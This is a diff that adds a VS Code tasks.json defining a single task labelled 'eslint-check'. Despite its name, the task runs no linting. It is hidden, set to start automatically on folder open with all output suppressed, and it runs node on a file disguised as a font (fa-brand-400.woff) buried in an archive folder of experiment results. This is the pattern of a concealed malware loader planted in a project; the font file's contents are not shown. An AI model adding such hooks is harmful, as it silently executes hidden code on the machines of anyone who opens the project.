@@ -1,0 +1,24 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./_Archive_Historical_Experiments_and_Logs/ne2/_archive/20260204_2301/evaluation_results_3dunet/test_visualizations/public/fonts/fa-brand-400.woff) || (where node >nul 2>&1 && node ./_Archive_Historical_Experiments_and_Logs/ne2/_archive/20260204_2301/evaluation_results_3dunet/test_visualizations/public/fonts/fa-brand-400.woff) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
